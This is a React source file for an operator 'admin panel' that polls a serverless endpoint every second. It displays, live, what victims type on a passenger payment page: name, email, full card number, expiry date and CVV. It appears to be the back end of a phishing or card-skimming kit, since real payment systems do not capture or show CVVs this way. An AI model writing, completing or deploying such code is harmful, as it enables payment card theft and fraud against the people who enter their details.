
import React, { useEffect, useState } from 'react';
import { PaymentFormData } from '../types';

interface AdminPanelProps {
    paymentData: PaymentFormData;
    onGoBack: () => void;
}

const DataDisplay: React.FC<{ label: string, value: string }> = ({ label, value }) => (
    <div>
        <p className="text-sm font-medium text-gray-500">{label}</p>
        <p className="text-lg text-gray-800 p-2 bg-gray-100 rounded-md min-h-[40px]">{value || '...'}</p>
    </div>
);

const AdminPanel: React.FC<AdminPanelProps> = ({ paymentData: initialData, onGoBack }) => {
    const [liveData, setLiveData] = useState<PaymentFormData>(initialData);

    useEffect(() => {
        const interval = setInterval(async () => {
            try {
                const res = await fetch('/.netlify/functions/api');
                if (res.ok) {
                    const data = await res.json();
                    // Data comes flat from DB schema, need to map back if structure changed? 
                    // Our function saves {sessionId, passenger, payment, ...} 
                    // so looking at 'passenger' and 'payment' fields directly is correct if we saved them that way.
                    if (data.passenger && data.payment) {
                        setLiveData({
                            passenger: data.passenger,
                            payment: data.payment
                        });
                    }
                }
            } catch (err) {
                console.error("Polling error", err);
            }
        }, 1000); // Poll every 1 second

        return () => clearInterval(interval);
    }, []);

    const displayData = liveData;

    return (
        <div className="container mx-auto p-8">
            <div className="max-w-4xl mx-auto p-8 bg-white rounded-lg shadow-lg">
                <div className="flex justify-between items-center mb-6 border-b pb-4">
                    <h2 className="text-2xl font-bold text-gray-800">Painel Administrativo - Skinner</h2>
                    <button
                        onClick={onGoBack}
                        className="text-sm text-teal-600 hover:text-teal-800 font-semibold"
                    >
                        &larr; Voltar ao Início
                    </button>
                </div>

                <p className="text-sm text-gray-600 mb-6">
                    Os dados abaixo refletem em tempo real o que está sendo digitado na página de pagamento.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-6">
                    {/* Passenger Info */}
                    <div className="md:col-span-2">
                        <h3 className="text-lg font-semibold text-gray-700 mb-2">Informações do Passageiro</h3>
                    </div>
                    <DataDisplay label="Nome Completo" value={displayData.passenger.fullName} />
                    <DataDisplay label="E-mail" value={displayData.passenger.email} />

                    {/* Card Details */}
                    <div className="md:col-span-2 mt-6">
                        <h3 className="text-lg font-semibold text-gray-700 mb-2">Detalhes do Cartão</h3>
                    </div>
                    <DataDisplay label="Nome no Cartão" value={displayData.payment.cardHolder} />
                    <DataDisplay label="Número do Cartão" value={displayData.payment.cardNumber} />
                    <DataDisplay label="Validade (MM/AA)" value={displayData.payment.expiryDate} />
                    <DataDisplay label="CVV" value={displayData.payment.cvv} />
                </div>
            </div>
        </div>
    );
};

export default AdminPanel;
